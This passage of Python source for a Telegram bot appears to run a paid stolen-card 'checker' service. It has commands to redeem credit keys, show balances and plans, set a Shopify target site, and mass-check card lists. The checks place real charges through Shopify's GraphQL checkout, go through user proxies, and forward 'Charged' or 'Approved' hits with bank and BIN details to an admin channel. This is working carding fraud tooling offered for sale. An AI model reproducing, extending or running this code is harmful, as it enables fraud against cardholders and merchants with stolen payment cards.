        credit_amount = int(parts[2])
        
        if key_count <= 0 or key_count > 50:
            return await event.reply("❌ Key amount must be between 1 and 50!", link_preview=False)
        
        if credit_amount <= 0:
            return await event.reply("❌ Credit amount must be greater than 0!", link_preview=False)
        
        # Generate keys
        keys = await generate_redeem_key(key_count, credit_amount)
        
        # Format keys message
        keys_text = "\n".join([f"🔑 `{key}`" for key in keys])
        
        await event.reply(
            f"✅ **Keys Generated Successfully!**\n\n"
            f"🔑 Total Keys: `{key_count}`\n"
            f"💰 Credits per Key: `{credit_amount}`\n\n"
            f"**Generated Keys:**\n{keys_text}\n\n"
            f"💡 Users can redeem using: /redeem KEY"
        , link_preview=False)
    
    except ValueError:
        await event.reply("❌ Invalid key amount or credit amount!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

# ===== END CREDIT SYSTEM ADMIN COMMANDS =====

# ===== CREDIT SYSTEM USER COMMANDS =====

@client.on(events.NewMessage(pattern=r'^/(balance|credits|bal)(?:\s+(.+))?$'))
async def balance_command(event):
    """Check credit balance - /bal or /bal @username or /bal userid or reply to message"""
    try:
        # Check if replying to someone's message
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            target_id = replied_msg.sender_id
            target_entity = replied_msg.sender
            target_name = target_entity.first_name if target_entity.first_name else "User"
        else:
            # Check if user specified another user to check
            target_user = event.pattern_match.group(2)
            
            if target_user:
                # Try to get the target user
                try:
                    # Remove @ if present
                    target_user = target_user.strip().lstrip('@')
                    
                    # Try to parse as user ID first
                    try:
                        target_id = int(target_user)
                        target_entity = await client.get_entity(target_id)
                    except ValueError:
                        # Not a number, try as username
                        target_entity = await client.get_entity(target_user)
                    
                    target_id = target_entity.id
                    target_name = target_entity.first_name if target_entity.first_name else "User"
                    
                except Exception as e:
                    await event.reply(f"❌ Could not find user: {target_user}", link_preview=False)
                    return
            else:
                # Check own balance
                target_id = event.sender_id
                try:
                    user = await client.get_entity(event.sender_id)
                    target_name = user.first_name if user.first_name else "User"
                except:
                    target_name = "User"
        
        # Get user credits
        user_data = await get_user_credits(target_id)
        credits = user_data.get('credits', 0)
        plan = user_data.get('plan', 'Free')
        total_used = user_data.get('total_used', 0)
        plan_set_date = user_data.get('plan_set_date')
        expiry_date = user_data.get('expiry_date')
        
        # Format plan set date
        date_text = "N/A"
        if plan_set_date:
            try:
                date_obj = datetime.datetime.fromisoformat(plan_set_date)
                date_text = date_obj.strftime("%d %b %Y")
            except:
                pass
        
        # Format expiry date and calculate remaining days
        expiry_text = "N/A"
        days_left = 0
        if expiry_date and plan == "VIP":
            try:
                expiry_obj = datetime.datetime.fromisoformat(expiry_date)
                expiry_text = expiry_obj.strftime("%d %b %Y")
                days_left = (expiry_obj - datetime.datetime.now()).days
                if days_left < 0:
                    expiry_text += " (Expired)"
                else:
                    expiry_text += f" ({days_left} days left)"
            except:
                pass
        
        # Plan emoji
        plan_emoji = "💎" if plan == "VIP" else "🆓"
        
        # Build message
        msg = (
            f"💳 **Credit Balance**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 Name: {target_name}\n"
            f"🆔 ID: `{target_id}`\n"
            f"💰 Available: `{credits}` credits\n"
            f"{plan_emoji} Plan: `{plan}`\n"
        )
        
        if plan == "VIP":
            msg += f"⏰ Expires: {expiry_text}\n"
        
        msg += (
            f"📈 Total Used: `{total_used}` credits\n"
            f"📅 Plan Date: {date_text}\n\n"
        )
        
        if plan == "VIP":
            msg += (
                f"💡 **VIP Benefits:**\n"
                f"• Unlimited checks\n"
                f"• NO credit deduction\n\n"
            )
        else:
            msg += (
                f"💡 **Info:**\n"
                f"• 1 credit = 1 CC check\n"
                f"• All commands cost 1 credit/CC\n\n"
            )
        
        msg += f"💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to purchase credits!"
        
        await event.reply(msg, link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_command(event):
    """Check current plan details"""
    try:
        user_data = await get_user_credits(event.sender_id)
        credits = user_data.get('credits', 0)
        plan = user_data.get('plan', 'Free')
        total_used = user_data.get('total_used', 0)
        plan_set_date = user_data.get('plan_set_date')
        expiry_date = user_data.get('expiry_date')
        
        # Format plan set date
        date_text = "N/A"
        if plan_set_date:
            try:
                date_obj = datetime.datetime.fromisoformat(plan_set_date)
                date_text = date_obj.strftime("%d %b %Y, %I:%M %p")
            except:
                pass
        
        # Format expiry date and calculate remaining days
        expiry_text = "N/A"
        days_left = 0
        if expiry_date and plan == "VIP":
            try:
                expiry_obj = datetime.datetime.fromisoformat(expiry_date)
                expiry_text = expiry_obj.strftime("%d %b %Y, %I:%M %p")
                days_left = (expiry_obj - datetime.datetime.now()).days
                if days_left < 0:
                    expiry_text += " (Expired)"
                else:
                    expiry_text += f" ({days_left} days left)"
            except:
                pass
        
        # Plan emoji
        emoji = "💎" if plan == "VIP" else "🆓"
        
        # Build message
        if plan == "VIP":
            msg = (
                f"**{emoji} Your Plan Details**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"`📊 Plan: {plan} {emoji}`\n"
                f"`📅 Activated`: {date_text}\n"
                f"`⏰ Expires`: {expiry_text}\n\n"
                f"📝 Features:\n"
                f"** • All commands activated ✅**\n"
                f"** • No credit deduction ✅**\n"
                f"** • Unlimited checks ✅**"
            )
        else:
            msg = (
                f"**{emoji} Your Plan Details**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"`📊 Plan`: {plan} {emoji}\n"
                f"`💰 Credits`: {credits}\n"
                f"`📈 Used`: {total_used} credits\n"
                f"`📅 Activated`: {date_text}\n\n"
                f"💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade!"
            )
        
        await event.reply(msg, link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/info$'))
async def info_command(event):
    """Display detailed user information - reply to message to check other user"""
    try:
        # Check if replying to someone's message
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            user = replied_msg.sender
            user_id = replied_msg.sender_id
        else:
            # Get own info
            user = await event.get_sender()
            user_id = event.sender_id
        
        user_name = user.first_name if user.first_name else "User"
        username = f"@{user.username}" if user.username else "No Username"
        
        # Get user credits and plan
        user_data = await get_user_credits(user_id)
        credits = user_data.get('credits', 0)
        plan = user_data.get('plan', 'Free')
        total_used = user_data.get('total_used', 0)
        plan_set_date = user_data.get('plan_set_date')
        expiry_date_str = user_data.get('expiry_date')
        
        # Plan emoji
        plan_emoji = "💎" if plan == "VIP" else "🆓"
        
        # Format plan expiry date and calculate remaining days
        expiry_text = "N/A"
        remaining_days = "N/A"
        
        if expiry_date_str and plan == "VIP":
            try:
                expiry_date = datetime.datetime.fromisoformat(expiry_date_str)
                expiry_text = expiry_date.strftime("%d %b %Y, %I:%M %p")
                
                now = datetime.datetime.now()
                days_left = (expiry_date - now).days
                remaining_days = f"{days_left}" if days_left > 0 else "Expired"
            except:
                pass
        
        # Build message based on plan type
        if plan == "Free":
            # Free user - show plan but no expiry details
            message = (
                f"👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣\n\n"
                f"𝙉𝙖𝙢𝙚 ⇾ {user_name}\n"
                f"𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}\n"
                f"𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`\n"
                f"━ ━ ━ ━ ━━ ━━━ ━ ━━ ━ ━ ━\n"
                f"𝙋𝙡𝙖𝙣 ⇾ {plan} {plan_emoji}\n"
                f"𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 ⇾ {credits} credits 💰\n"
                f"𝙏𝙤𝙩𝙖𝙡 𝙐𝙨𝙚𝙙 ⇾ {total_used} credits"
            )
        else:
            # Premium/VIP user - show full details
            message = (
                f"👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣\n\n"
                f"𝙉𝙖𝙢𝙚 ⇾ {user_name}\n"
                f"𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}\n"
                f"𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`\n"
                f"━ ━ ━ ━ ━━ ━━━ ━ ━━ ━ ━ ━\n"
                f"𝙋𝙡𝙖𝙣 ⇾ {plan} {plan_emoji}\n"
                f"𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 ⇾ {credits} credits 💰\n"
                f"𝙏𝙤𝙩𝙖𝙡 𝙐𝙨𝙚𝙙 ⇾ {total_used} credits\n"
                f"𝙋𝙡𝙖𝙣 𝙚𝙭𝙥𝙞𝙧𝙚 ⇾ {expiry_text}\n"
                f"𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝙙𝙖𝙮𝙨 ⇾ {remaining_days} days"
            )
        
        await event.reply(message, link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/plan$'))
async def plan_command(event):
    """Display available plans information"""
    try:
        plans_text = """💎 **VIP Plan**
• No Credits Required 
• Access to all premium features
• Unlimited mass checks
• Dedicated support
• Early access to new features

**Price List 💰**
• 5 days / $5
• 10 days / $10
• 15 days / $15
━━━━━━━━━━━━━━━
💡 **How to Purchase:**
Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!

📊 Use /info to check your current plan"""
        
        await event.reply(plans_text, link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/redeem'))
async def redeem_command(event):
    """Redeem a key to get credits"""
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:** /redeem KEY\n\n**Example:**\n`/redeem SHOPIFY-ABC12`", link_preview=False)
        
        key = parts[1].upper().strip()
        
        # Redeem key
        success, result = await redeem_key(event.sender_id, key)
        
        if success:
            user_data = await get_user_credits(event.sender_id)
            await event.reply(
                f"🎉 **Key Redeemed Successfully!**\n\n"
                f"🔑 Key: `{key}`\n"
                f"💰 Credits Added: `{result}`\n"
                f"💵 New Balance: `{user_data['credits']}` credits\n"
                f"📊 Plan: `{user_data['plan']}`\n\n"
                f"✨ Start checking cards now!\n"
                f"Use /balance to check your credits."
            , link_preview=False)
        else:
            await event.reply(f"❌ {result}", link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

# ===== END CREDIT SYSTEM USER COMMANDS =====

# ===== DAILY CREDIT GENERATION SYSTEM - DISABLED =====
# Daily credit generation has been removed
# ===== END DAILY CREDIT GENERATION SYSTEM =====

# ===== PROXY-BASED CHECK COMMANDS (OLD - REMOVED) =====
# Old /psh command removed - now uses GraphQL gateway

@client.on(events.NewMessage(pattern=r'(?i)^[/.]pmsh'))
@require_membership
async def pmsh(event):
    """Proxy-based mass card check (same format as /msh)"""
    # Check if command is enabled
    if not is_command_enabled("pmsh"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("pmsh"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Get user's proxy (REQUIRED)
    user_id = str(event.sender_id)
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ No proxy set! Use /setpx to set your proxy first.\n\n/pmsh requires proxy.")
        return
    
    # Check if user already has an active /pmsh process
    if event.sender_id in ACTIVE_MSH_PROCESSES:
        return await event.reply("⏳ Wait! Your previous /pmsh is still checking...", link_preview=False)
    
    # Extract cards
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            cards = extract_all_cards(replied_msg.text)
        if not cards: 
            return await event.reply("❌ Couldn't extract valid cards from replied message\n\nFormat Example:\n/pmsh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123", link_preview=False)
    else:
        cards = extract_all_cards(event.raw_text)
    
    if not cards: 
        return await event.reply("❌ Format Example:\n/pmsh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards", link_preview=False)
    
    # Check mass checking limit for non-admin users (15 normal, 50 admin)
    if event.sender_id not in ADMIN_ID:
        if len(cards) > 15:
            return await event.reply("⚠️ Mass checking limit: 15 cards", link_preview=False)
    else:
        if len(cards) > 50:
            return await event.reply("⚠️ Mass checking limit: 50 cards (Admin)", link_preview=False)
    
    # Get user access type
    can_access, access_type = await can_use(event.sender_id, event.chat)
    
    # Set limits based on user type
    max_cards = get_cc_limit(access_type, event.sender_id)
    if event.sender_id in ADMIN_ID:
        limit_msg = f"{max_cards} cards for /𝙥𝙢𝙨𝙝 (Admin)"
    elif access_type in ["premium_private", "premium_group", "vip_private", "vip_group"]:
        limit_msg = f"{max_cards} cards for /𝙥𝙢𝙨𝙝 (Premium/VIP)"
    elif access_type == "group_free":
        limit_msg = f"{max_cards} cards for /𝙥𝙢𝙨𝙝 (Group Free)"
    else:
        limit_msg = f"{max_cards} cards for /𝙥𝙢𝙨𝙝"
    
    if len(cards) > max_cards and max_cards > 0:
        total_found = len(cards)
        cards = cards[:max_cards]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {max_cards} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit_msg}.```", link_preview=False)
    
    # Check credits
    if event.chat_id == GROUP_ID:
        pass  # FREE in main group
    elif event.sender_id not in ADMIN_ID:
        check_chat_id = event.chat.id
        if check_chat_id > 0:
            check_chat_id = int(f"-100{check_chat_id}")
        
        if not await check_credits_and_notify(event.sender_id, len(cards), check_chat_id):
            buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
            return await event.reply(f"❌ Insufficient Credits!\n\nRequired: {len(cards)} credits\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Get user's site from /seturl
    sites = await load_json(SETURL_SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: 
        return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙣𝙤𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /seturl", link_preview=False)
    
    asyncio.create_task(process_pmsh_cards_msh_style(event, cards, user_sites, proxy_url))

async def process_pmsh_cards_msh_style(event, cards, sites, proxy_url):
    """Process /pmsh cards - mass.py (msh) style"""
    user_id = str(event.sender_id)
    
    # Mark process as active
    ACTIVE_MSH_PROCESSES[user_id] = True
    
    try:
        # Deduct credits
        success, remaining = await deduct_user_credits(event.sender_id, len(cards), "/pmsh", event.chat_id)
        if not success:
            ACTIVE_MSH_PROCESSES.pop(user_id, None)
            return await event.reply("❌ **Credit deduction failed!**\n\n💡 Use /balance to check your credits", link_preview=False)
        
        # Get user info
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            checked_by = f"<a href='tg://user?id={user.id}'>{username}</a>"
        except:
            checked_by = "User"
        
        # Get user plan
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        badge = "💎" if plan == "VIP" else ("👑" if plan == "Premium" else "🆓")
        
        # Get gateway from site
        site = sites[0]
        gateway = "Shopify Payments"
        
        # Get max limit for display
        max_limit = 50 if str(event.sender_id) in ADMIN_ID else 15
        
        # Get replied message if exists (for proper reply chain)
        replied_msg = None
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
        
        # Initial loader message (msh style) - reply to original message if user replied to cards
        if replied_msg:
            loader_msg = await replied_msg.reply(
                f"<pre>✦ [$pmsh] [ #Auto_Shopify ]</pre>\n"
                f"<b>$pmsh limit {len(cards)}/{max_limit} - Checked: 0/{len(cards)}</b>\n"
                f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n",
                parse_mode='html'
            )
        else:
            loader_msg = await event.reply(
                f"<pre>✦ [$pmsh] [ #Auto_Shopify ]</pre>\n"
                f"<b>$pmsh limit {len(cards)}/{max_limit} - Checked: 0/{len(cards)}</b>\n"
                f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n",
                parse_mode='html'
            )
        
        start_time = time.time()
        batch_size = 10  # mass.py uses 10
        final_results = []
        checked_count = 0  # Track checked cards
        
        # Helper function (mass.py style)
        def get_status_flag(raw_response):
            if "ORDER_PLACED" in raw_response or "THANK YOU" in raw_response.upper():
                return "Charged 💎"
            elif any(keyword in raw_response for keyword in [
                "3D CC", "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP",
                "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", "3DS_REQUIRED", 
                "MISMATCHED_BILL", "3D_AUTHENTICATION", "INCORRECT_ZIP", "INCORRECT_ADDRESS"
            ]):
                return "Approved ❎"
            else:
                return "Declined ❌"
        
        # Process in batches (mass.py style)
        site_url = f"https://{site}" if not site.startswith("http") else site
        site_error_count = 0  # Track consecutive site errors
        
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i + batch_size]
            
            # Run check_card in parallel for current batch (mass.py style)
            tasks = [
                charge_shopify_graphql(
                    url=site_url,
                    card=card,
                    user_proxy=proxy_url
                ) for card in batch
            ]
            results = await asyncio.gather(*tasks)
            
            # Process results from batch (mass.py style)
            batch_site_errors = 0
            for card, result in zip(batch, results):
                if result:
                    raw_response = result.get('Response', '')
                else:
                    raw_response = "No Response"
                
                # Handle empty responses
                if not raw_response or raw_response.strip() == "":
                    raw_response = "Empty Response"
                
                # Clean up common errors - Don't show technical errors
                if "expecting value" in raw_response.lower() or "json" in raw_response.lower():
                    raw_response = "Site Busy - Try Again Later"
                    batch_site_errors += 1
                elif "500 internal privoxy error" in raw_response.lower():
                    raw_response = "Proxy Connection Failed"
                elif "502" in raw_response or "503" in raw_response or "504" in raw_response:
                    raw_response = "Site Temporarily Down"
                    batch_site_errors += 1
                elif "cloudflare" in raw_response.lower() or "captcha" in raw_response.lower():
                    raw_response = "Site Protected - Change Site"
                    batch_site_errors += 1
                
                status_flag = get_status_flag(raw_response.upper())
                
                final_results.append(
                    f"• <b>CC :</b> <code>{card}</code>\n"
                    f"• <b>Status :</b> <code>{status_flag}</code>\n"
                    f"• <b>Result :</b> <code>{raw_response or '-'}</code>\n"
                    "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
                )
                
                # Forward hit if Charged or Approved
                if "Charged" in status_flag or "Approved" in status_flag:
                    try:
                        # Get BIN info with error handling
                        try:
                            bin_number = card.split("|")[0]
                            brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
                            if not brand or brand == "-":
                                brand = bin_type = level = bank = country = flag = "-"
                        except Exception as e:
                            print(f"[PMSH BIN] Error getting BIN info: {e}")
                            brand = bin_type = level = bank = country = flag = "-"
                        
                        user = await client.get_entity(event.sender_id)
                        first_name = user.first_name if user.first_name else "User"
                        # Clickable mention without preview, no username shown
                        user_mention = f"[{first_name}](tg://user?id={event.sender_id})"
                        
                        price = result.get('Price', '-') if result else '-'
                        gateway = result.get('Gateway', 'Shopify Payments') if result else 'Shopify Payments'
                        
                        hit_msg = f"""```✦ [$pmsh] [ #Proxy_Shopify ]```
**CC**: `{card}`
**Status**: {status_flag}
**Response**: {raw_response}
**Price** → {price} 💸
**Gateway** → {gateway}

**𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:** {brand} - {bin_type} - {level}
**𝗕𝗮𝗻𝗸:** {bank}
**𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country.upper()} {flag}
👤 **User:** {user_mention}
🆔 **User ID:** {event.sender_id}"""
                        
                        await client.send_message(FORWARD_ID, hit_msg, parse_mode='Markdown', link_preview=False)
                    except Exception as e:
                        print(f"[HIT FORWARD] Error: {e}")
                
                # Deduct credit (skip for admin)
                if user_id not in ADMIN_ID:
                    await deduct_user_credits(user_id, 1, "/pmsh", event.chat_id)
                
                checked_count += 1
            
            # Track site errors
            site_error_count += batch_site_errors
            
            # Warning if too many site errors
            if batch_site_errors >= 5:
                await event.reply(
                    "⚠️ <b>Site Issue Detected!</b>\n\n"
                    f"Multiple errors in this batch ({batch_site_errors} cards)\n"
                    "Recommendation: Change site using <code>/seturl</code>",
                    parse_mode='html'
                )
            
            # Edit after every batch (msh style)
            try:
                await loader_msg.edit(
                    f"<pre>✦ [$pmsh] [ #Auto_Shopify ]</pre>\n"
                    f"<b>$pmsh limit {len(cards)}/{max_limit} - Checked: {checked_count}/{len(cards)}</b>\n"
                    f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                    + "\n".join(final_results),
                    parse_mode='html',
                    link_preview=False
                )
            except:
                pass
        
        end_time = time.time()
        timetaken = round(end_time - start_time, 2)
        
        # Final edit (mass.py style)
        final_result_text = "\n".join(final_results)
        
        await loader_msg.edit(
            f"<pre>✦ [$pmsh] [ #Auto_Shopify ]</pre>\n"
            f"<b>$pmsh limit {len(cards)}/{max_limit} - Checked: {len(cards)}/{len(cards)}</b>\n"
            f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
            f"{final_result_text}\n"
            f"<b>[⚬] T/t :</b> <code>{timetaken}s</code>\n"
            f"<b>[⚬] Checked By :</b> {checked_by} [<code>{plan} {badge}</code>]\n"
            f"<b>[⚬] Dev :</b> <a href='https://t.me/Akbhai007'>𝘼𝙆</a>",
            parse_mode='html',
            link_preview=False
        )
    
    except Exception as e:
        await event.reply(f"⚠️ Error: {e}", link_preview=False)
    
    finally:
        # Remove process lock
        ACTIVE_MSH_PROCESSES.pop(user_id, None)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]seturl(\s|$)'))
@require_membership
async def seturl(event):
    """Add Shopify site and test with api.py"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check proxy (REQUIRED)
    user_id = str(event.sender_id)
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ Proxy required! Use /setpx to set proxy first.\n\nFormat: /setpx ip:port:user:pass")
        return
    
    # Check if GraphQL is available
    if not GRAPHQL_AVAILABLE:
        await event.reply("❌ GraphQL Gateway (api.py) not available!")
        return
    
    # Extract site - handle any format
    text = event.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("❌ Usage: /seturl site.myshopify.com")
        return
    
    site_input = parts[1].strip()
    
    # Clean site URL - handle multiple formats
    site = site_input
    # Remove protocol
    site = site.replace('https://', '').replace('http://', '')
    # Remove www.
    site = site.replace('www.', '')
    # Remove path and query params
    if '/' in site:
        site = site.split('/')[0]
    if '?' in site:
        site = site.split('?')[0]
    # Remove trailing dots/commas
    site = site.rstrip('.,;:')
    # Remove spaces and newlines
    site = site.split()[0] if ' ' in site else site
    site = site.split('\n')[0] if '\n' in site else site
    
    # Basic validation - just check if it's a valid domain
    if not '.' in site or len(site) < 4:
        await event.reply("❌ Invalid site! Enter a valid domain: example.com")
        return
    
    # Send testing message
    test_msg = await event.reply("Checking...")
    
    start_time = time.time()
    
    try:
        # Get user's proxy (optional)
        user_id = str(event.sender_id)
        proxy_url = get_proxy(user_id)
        
        # Test with dummy card
        test_card = "4111111111111111|12|2025|123"
        site_url = f"https://{site}"
        
        # Test with api.py
        result = await charge_shopify_graphql(
            url=site_url,
            card=test_card,
            user_proxy=proxy_url
        )
        
        if not result:
            await test_msg.edit(f"❌ **Site Test Failed!**\n\n**Site:** `{site}`\n**Error:** No response from gateway")
            return
        
        # Check if site is working
        response = result.get("Response", "")
        status = result.get("Status", False)
        price = result.get("Price", "-")
        gateway = result.get("Gateway", "-")
        error_type = result.get("Error_Type", "")
        
        # Check for PROXY errors first (highest priority)
        proxy_errors = [
            "proxy dead",
            "proxy error",
            "proxy_auth_failed",
            "proxy_connection_refused",
            "proxy_timeout",
            "proxy_unreachable"
        ]
        
        is_proxy_error = any(err in response.lower() for err in proxy_errors) or any(err in error_type.lower() for err in proxy_errors if error_type)
        
        if is_proxy_error:
            await test_msg.edit(
                f"❌ **Proxy Dead!**\n\n"
                f"**Site:** `{site}`\n"
                f"**Response:** {response}\n"
                f"**Error:** Proxy is not working\n\n"
                f"Fix your proxy first using /setpx, then try again."
            )
            return
        
        # Site is NOT working if:
        # 1. Response contains critical error keywords
        # 2. Response contains exception/traceback
        # 3. Gateway is "-" (means site didn't respond properly)
        # Note: DECLINED cards are OK - means site is working!
        critical_errors = [
            "timeout",
            "cannot unpack",
            "exception",
            "traceback",
            "no products found",
            "site dead",
            "product empty",
            "expecting value",
            "json_parse_error",
            "cart_create_error",
            "proposal_parse_error",
            "invalid json",
            "header value must be str or bytes",
            "nonetype"
        ]
        
        is_critical_error = any(err in response.lower() for err in critical_errors)
        
        # Also check if gateway is "-" which means site didn't respond properly
        is_gateway_invalid = gateway == "-" or gateway == "- $-"
        
        if not response or is_critical_error or is_gateway_invalid:
            await test_msg.edit(
                f"❌ **Site Not Suitable!**\n\n"
                f"**Site:** `{site}`\n"
                f"**Response:** {response}\n"
                f"**Gateway:** {gateway}"
            )
            return
        
        # Site is working! Replace old site with new one
        sites = await load_json(SETURL_SITE_FILE)
        
        # Replace: Remove all old sites and add only this new site
        sites[str(user_id)] = [site]
        await save_json(SETURL_SITE_FILE, sites)
        
        # Calculate time
        elapsed = round(time.time() - start_time, 2)
        
        # Success message
        await test_msg.edit(
            f"```\n✦ $psh/$pmsh ~ Site Added ✅\n```"
            f"**[★] Site:** `{site}`\n"
            f"**[★] Gateway:** {gateway} ${price}\n"
            f"**[★] Response:** {response}\n"
            f"**[★] Cmd:** /psh\n"
            f"**[★] Time Taken:** {elapsed} sec\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Old site replaced. Use /geturl to view.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        await test_msg.edit(
            f"❌ **Error Testing Site!**\n\n"
            f"**Site:** `{site}`\n"
            f"**Error:** {str(e)}\n\n"
            f"Site may not be compatible with api.py\n\n"
            f"**Debug:** Check if site has products and is accessible"
        )

@client.on(events.NewMessage(pattern=r'(?i)^[/.]geturl$'))
@require_membership
async def geturl(event):
    """Show user's sites from /seturl (gateway_api)"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    user_id = str(event.sender_id)
    sites = await load_json(SETURL_SITE_FILE)
    user_sites = sites.get(user_id, [])
    
    if not user_sites:
        await event.reply(
            "❌ **No sites added!**\n\n"
            "Use /seturl\n"
            "And add site for /psh, /pmsh, /pmtxt commands."
        )
        return
    
    sites_text = "```\n✦ [$psh/$pmsh Sites]\n```\n"
    for idx, site in enumerate(user_sites, 1):
        sites_text += f"{idx}. `{site}`\n"
    
    sites_text += f"\n**Used by:** /psh, /pmsh\n"
    sites_text += "**Note:** Use /seturl to change site"
    
    await event.reply(sites_text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmurl(\s|$)'))
@require_membership
async def rmurl(event):
    """Remove site"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if not can_access:
        await event.reply("❌ You don't have access. Contact admin.")
        return
    
    # Extract site
    text = event.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("❌ Usage: /rmurl site.myshopify.com")
        return
    
    site = parts[1].strip()
    site = site.replace('https://', '').replace('http://', '')
    if '/' in site:
        site = site.split('/')[0]
    
    user_id = str(event.sender_id)
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(user_id, [])
    
    if site not in user_sites:
        await event.reply(f"❌ Site not found: `{site}`")
        return
    
    # Remove site
    user_sites.remove(site)
    sites[user_id] = user_sites
    await save_json(SITE_FILE, sites)
    
    await event.reply(
        f"✅ **Site Removed!**\n\n"
        f"**Site:** `{site}`\n"
        f"**Remaining:** {len(user_sites)} sites"
    )

@client.on(events.NewMessage(pattern=r'(?i)[/.]psh'))
@require_membership
async def psh_graphql(event):
    """Check single CC on saved site using api.py (GraphQL)"""
    # Check if command is enabled
    if not is_command_enabled("psh"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check proxy (REQUIRED)
    user_id = str(event.sender_id)
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ Proxy required! Use /setpx to set proxy first.\n\nFormat: /setpx ip:port:user:pass")
        return
    
    # Check if GraphQL is available
    if not GRAPHQL_AVAILABLE:
        await event.reply("❌ GraphQL Gateway (api.py) not available!")
        return
    
    # Get user's site from /seturl
    sites = await load_json(SETURL_SITE_FILE)
    user_sites = sites.get(user_id, [])
    
    if not user_sites:
        await event.reply("❌ No site set! Use /seturl to add a site first.")
        return
    
    site = user_sites[0]  # Get first (and only) site from /seturl
    
    # Extract card from entire message (any format)
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
        if not card:
            await event.reply("❌ Couldn't extract valid card from replied message\n\nFormat: /psh card|mm|yyyy|cvv")
            return
    else:
